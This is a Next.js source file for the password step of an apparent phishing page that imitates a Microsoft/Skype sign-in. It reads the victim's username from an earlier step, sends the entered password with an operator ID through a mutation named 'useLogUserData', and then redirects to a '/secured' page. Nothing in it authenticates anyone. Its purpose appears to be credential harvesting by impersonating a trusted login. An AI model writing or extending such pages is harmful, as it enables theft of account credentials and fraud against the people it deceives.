// app/(auth)/email/page.tsx
"use client";

import { queryClient } from "@/components/providers";
import { ApiError } from "@/lib/apiError";
import { useLogUserData } from "@/lib/react-query/mutations";
import { ID } from "@/lib/vars";
import { zodResolver } from "@hookform/resolvers/zod";
import { notFound, useRouter } from "next/navigation";
import { useForm } from "react-hook-form";
import z from "zod";

const passwordSchema = z.object({
  // TODO: Add password validation rules
  password: z
    .string("Enter a valid email address, phone number, or Skype name.")
    .min(1, "Enter a valid email address, phone number, or Skype name."),
});

const id = ID;

export default function PasswordPage() {
  const router = useRouter();
  // const username = "test";
  const username = queryClient.getQueryData(["username"]);

  const { mutate } = useLogUserData();

  const { register, handleSubmit, formState, setError } = useForm<
    z.infer<typeof passwordSchema>
  >({
    resolver: zodResolver(passwordSchema),
    mode: "onSubmit",
    defaultValues: { password: "" },
  });

  if (!username || typeof username !== "string") {
    return notFound();
  }

  return (
    <form
      onSubmit={handleSubmit(async (data) => {
        await new Promise<void>((resolve) => {
          mutate(
            { id, username, password: data.password },
            {
              onSettled: () => resolve(),
              onSuccess: () => {
                router.push("/secured");
              },
              onError: (error: ApiError) => {
                console.error("Error occurred while logging user data:", error);
                // check if error.error is an array and has at least one element with a message property

                // Handle the case where the error is an array of objects with a message property
                setError("password", {
                  message: error.message,
                });
              },
            },
          );
        });
      })}
      className="space-y-4"
    >
      <p className="rounded-full border border-gray-100/20 w-fit bg-gray-200 px-1.5 py-0.5 text-sm text-gray-500">
        {username}
      </p>
      <h1 className="text-2xl font-semibold text-gray-900">
        Enter your password
      </h1>
      <div>
        <input
          {...register("password")}
          placeholder="Password"
          aria-invalid={formState.errors.password ? "true" : "false"}
          className="w-full py-1 border-b placeholder:text-gray-500 focus:border-b focus:outline-none focus:ring-0 peer border-b-gray-500 focus:border-b-gray-500 aria-invalid:border-b-red-500 aria-invalid:focus:border-b-red-500"
        />
        {formState.errors.password && (
          <p className="text-[15px] text-red-500 mt-0.5">
            {formState.errors.password.message}
          </p>
        )}
      </div>
      <button
        type="submit"
        className="ml-auto bg-primary text-white py-1 px-3 block hover:bg-primary/80 min-w-27 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
      >
        Next
      </button>
      {/* <AnimatedLoadingDots /> */}
      {/* <FullPageLoading />
      <ButtonLoading /> */}
      {/* <button>Other ways to sign in</button> */}
    </form>
  );
}
